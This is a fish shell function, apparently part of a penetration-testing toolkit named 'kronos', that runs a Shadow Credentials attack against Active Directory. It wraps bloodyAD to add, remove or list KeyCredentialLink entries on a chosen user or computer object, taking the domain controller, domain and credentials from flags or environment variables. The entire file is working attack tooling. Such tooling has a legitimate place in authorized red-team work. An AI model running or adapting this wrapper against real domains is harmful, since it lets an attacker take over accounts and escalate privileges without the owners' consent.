# description: Shadow Credentials attack (KeyCredentialLink)
function __kronos_shadow_credentials --description "Shadow Credentials attack (KeyCredentialLink)"
    argparse h/help u/username= p/password= k/kerberos t/target-object= a/action= -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos shadow-credentials [TARGET_DC] [OPTIONS]"
        echo ""
        echo "Perform Shadow Credentials attack (KeyCredentialLink) using bloodyAD."
        echo ""
        echo "Options:"
        echo "  -t, --target-object NAME Target AD object (e.g. 'web01\$' or 'p.user')"
        echo "  -a, --action ACTION      Action (add, remove, list) - default: add"
        echo "  -u, --username USER      Auth username"
        echo "  -p, --password PASS      Auth password"
        echo "  -k, --kerberos           Use Kerberos authentication"
        echo "  -h, --help               Show this help message"
        return 0
    end

    set -l target $argv[1]
    if test -z "$target"; set target $TGT_DC_IP; end
    if test -z "$target"; set target $TGT_DC; end
    if test -z "$target"
        echo "error: target DC is required" >&2
        return 1
    end

    if not set -q _flag_target_object
        echo "error: --target-object is required" >&2
        return 1
    end

    set -l action "add"
    if set -q _flag_action; set action $_flag_action; end

    set -l domain $TGT_DC_DOMAIN
    if test -z "$domain"
        echo "error: \$TGT_DC_DOMAIN is not set" >&2
        return 1
    end

    set -l cmd_str bloodyAD --host "$target" -d "$domain"
    if set -q _flag_kerberos
        set -a cmd_str -k
    else
        set -l auth_user $_flag_username; if test -z "$auth_user"; set auth_user $TGT_CRED_USERNAME; end
        set -l auth_pass $_flag_password; if test -z "$auth_pass"; set auth_pass $TGT_CRED_PASSWORD; end
        if test -z "$auth_user"
            echo "error: auth credentials required" >&2
            return 1
        end
        set -a cmd_str -u "$auth_user" -p "$auth_pass"
    end

    set -a cmd_str $action shadowCredentials "$_flag_target_object"

    echo "[*] Performing Shadow Credentials $action on $_flag_target_object..."
    command $cmd_str
end
